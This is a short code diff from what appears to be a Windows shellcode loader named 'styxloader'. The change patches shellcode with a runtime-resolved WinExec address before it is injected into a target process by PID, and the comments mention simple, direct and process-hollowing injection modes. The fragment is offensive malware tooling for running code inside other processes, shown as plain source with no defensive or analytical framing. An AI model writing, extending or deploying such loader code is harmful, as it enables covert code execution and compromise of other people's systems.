@@ -54,6 +54,19 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
+    // Patch shellcode with the runtime-resolved WinExec address (commit 6).
+    // The shellcode.asm layout reserves the first 8 bytes for this address;
+    // the code at offset 8+ loads it via RIP-relative addressing.
+    // For 'hollow' mode, the patching happens inside ProcessHollowing
+    // (because that function re-reads the file itself); skip it here.
+    if (mode == "simple" || mode == "direct") {
+        if (!styxloader::PatchShellcodeWinExec(shellcode)) {
+            std::cout << "Error: failed to patch shellcode with WinExec address. "
+                         "Cannot proceed — the shellcode would call an invalid address." << std::endl;
+            return 1;
+        }
+    }
+
     bool success = false;
     if (mode == "simple" || mode == "direct") {
         // simple and direct modes both take a PID as target
